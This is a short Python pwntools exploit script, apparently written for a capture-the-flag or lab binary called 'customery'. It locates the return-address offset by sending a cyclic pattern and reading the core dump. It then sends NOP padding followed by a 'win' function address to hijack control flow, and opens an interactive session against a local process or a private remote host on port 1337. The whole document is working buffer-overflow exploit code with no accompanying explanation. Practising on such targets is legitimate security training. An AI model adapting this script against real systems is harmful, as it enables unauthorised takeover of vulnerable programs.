from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:
        # set up Konsole
        context.terminal = ["konsole", "-e"]
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("10.10.1.11", 1337)
    else:
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    p = process(exe)
    p.recvuntil("===================================\n")
    p.sendline("1")
    p.sendline("1")
    p.sendline("yes")
    p.sendlineafter(":", payload)
    p.wait()
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4).decode())
    info("located EIP/RIP offset at {a}".format(a=ip_offset))
    return ip_offset


gdbscript = """
b *0x40140f
continue
""".format(
    **locals()
)

exe = "./out/customery"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"

io = start()
offset = find_ip(cyclic(150))
win_addr = 0x401951

io.recvuntil("===================================\n")
io.sendline("1")
io.sendline("1")
io.sendline("yes")
payload = flat(
    asm("nop", arch="amd64") * offset,
    win_addr,
)
info("payload: %s", enhex(payload))
io.sendlineafter(":", payload)

io.interactive()
